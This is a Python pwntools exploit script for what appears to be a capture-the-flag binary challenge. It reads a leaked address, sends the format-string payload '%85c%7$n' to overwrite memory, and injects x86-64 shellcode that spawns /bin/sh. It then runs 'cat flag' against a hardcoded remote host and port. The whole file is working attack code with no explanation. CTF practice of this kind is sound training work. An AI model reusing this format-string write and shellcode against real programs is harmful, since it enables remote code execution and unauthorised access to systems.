#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./1d3c852354df4609bf8e56fe8e9df316']
use_gdb = False

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()


    p.recvuntil("secret[0] is ")
    addr = p.recvuntil("\n")
    print(addr)
    p.sendafter("name be:", "aabb\n")
    p.sendafter("east or up?:", "east\n")
    p.sendafter("leave(0)?:", "1\n")
    p.sendafter("\'Give me an address\'", str(int(addr.strip(), 16))+"\n")
    p.sendafter("And, you wish is:", "%85c%7$n\n")

    # send shellcode
    shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

    #p.recvuntil("USE YOU SPELL")
    #p.sendline(shellcode)
    p.sendafter("USE YOU SPELL", shellcode)
    #0x90 - 0x78   + 0x30 + 0x78

    p.recv()
    if remote_run:
        p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:56385'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)